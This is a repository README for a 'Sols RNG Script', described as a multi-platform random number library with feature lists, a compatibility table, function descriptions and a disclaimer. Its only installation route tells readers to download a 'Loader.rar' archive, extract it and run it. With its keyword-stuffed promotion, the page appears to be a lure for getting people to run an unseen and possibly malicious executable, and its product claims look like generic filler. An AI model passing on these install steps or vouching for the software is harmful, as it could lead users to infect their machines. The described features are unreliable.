# ✨ Sols RNG Script ✨

Welcome to **Sols RNG Script!** 🎲  
Experience the next generation of robust random number generation for applications, games, research, and automation. Designed for lightning-fast performance and secure, verifiable outputs.  
This repository offers an advanced, flexible script compatible with multiple operating systems and includes user-friendly features for effortless integration.

---

## 🚀 Features

- **Universal OS Support:** Runs seamlessly on Windows, macOS, and major Linux distributions.
- **Customizable RNG Mechanics:** Choose seed, range, and algorithm to suit your needs.
- **Speed Optimization:** Blazing-fast results even under heavy loads.
- **Easy Integration:** Simple API for quick embedding in your projects.
- **Secure Outputs:** Generates high-entropy, unpredictable values.
- **Bulk Generation:** Generate thousands of numbers at once without lag.
- **Readable Output Formats:** Get results in JSON, CSV, or plain text.
- **Automated Logging:** Track RNG events with detailed records for later verification.
- **Extensive Documentation:** Clear examples and detailed function descriptions.
- **User-centric Support:** Prompt issue tracking and helpful community discussions.

---

## 🖥️ OS Compatibility Table

| Operating System         | Supported Version         | Status       | Emoji   |
|-------------------------|--------------------------|--------------|---------|
| Windows 10 / 11         | All x64 / x86 builds     | ✅ Supported | 🪟      |
| Linux (Debian/Ubuntu)   | Kernel 4.15+             | ✅ Supported | 🐧      |
| Linux (Fedora/CentOS)   | Kernel 4.15+             | ✅ Supported | 🌟      |
| macOS Big Sur / Sonoma  | v11.0+                   | ✅ Supported | 🍎      |
| Windows Server 2016+    | All builds               | ✅ Supported | 📦      |
| Arch / Manjaro Linux    | Kernel 4.15+             | ✅ Supported | 🏹      |
| FreeBSD                 | 12.0+                    | ⏳ Test Soon | 🦦      |
| Raspberry Pi OS         | Buster+                  | ✅ Supported | 🍓      |

---

## 📝 Function Descriptions

| Function               | Description                                                                                         | Usage Example                                         |
|------------------------|-----------------------------------------------------------------------------------------------------|-------------------------------------------------------|
| `init_rng(seed, alg)`  | Initialize RNG with seed and selected algorithm (e.g. Mersenne Twister, LCG, ARC4).                | `init_rng(12345, "mersenne")`                        |
| `random_number(min, max)` | Returns a single random integer between a defined range.                                      | `random_number(1, 100)`                              |
| `random_float(min, max)`  | Outputs a random float within a specified range.                                               | `random_float(0.0, 1.0)`                             |
| `bulk_generate(count, type, range)` | Produces a list of random numbers/floats.                                       | `bulk_generate(1000, "int", (1, 100))`               |
| `export_results(format)`        | Exports numbers to JSON, CSV, or TXT for analysis or sharing.                       | `export_results("csv")`                              |
| `log_event(event_type)`         | Adds entries to the operation log (generation, export, etc.).                       | `log_event("bulk_generate")`                         |
| `set_entropy_source(source)`    | Switches RNG entropy between system, manual, or time-based sources.                  | `set_entropy_source("manual")`                       |
| `verify_output(token)`          | Verifies the authenticity and reproducibility of a result.                          | `verify_output("0x1ab23...")`                        |
| `help()`                       | Displays documentation and usage examples.                                           | `help()`                                             |

Find more detailed function usage in our [Wiki](./Wiki.md).

---

## 📦 Installation

Start using **Sols RNG Script** in seconds!

1. **Download** `Loader.rar` from the repository.
2. Extract `Loader.rar` using your favorite archiver (7zip, WinRAR, or the built-in tool).
3. Follow the OS-specific guide in the `INSTALL.md` file inside the archive.
4. If you need platform-specific dependencies, see the included README in `/platform`.
5. Run the script with your chosen interpreter or double-click if using the GUI launcher.

---

## 🏆 Popular Use Cases & Keywords

- Random number utility for gaming 🎮
- Secure lottery and giveaway software 🏅
- Data science RNG framework 📈
- Automated task randomizer 🤖
- Testing and simulation tools 🧪
- Flexible, portable scripting solution 🔓
- Robust entropy engine for software development 💻
- Multi-platform, seamless deployment 📲
- Custom range and seed configuration 🔑
- Bulk data generation and analytics 📊

---

## ⚠️ Disclaimer

This software is distributed **as-is** and is intended solely for educational, entertainment, and development purposes.  
The maintainers are **not responsible** for any misuse or unintended consequences arising from deployment in production or commercial workflows.  
Always review source code and security implications before integrating with sensitive projects.  
All intellectual rights remain with their respective owners.

---

## 📄 License

This project is licensed under the [MIT License](https://opensource.org/license/mit/).

---

## 💬 Get Involved!

- ⭐ Star this repository to support development!
- ⬆️ Open issues for bug reports or feature requests.
- 🌍 Join discussions and help evolve **Sols RNG Script**.

---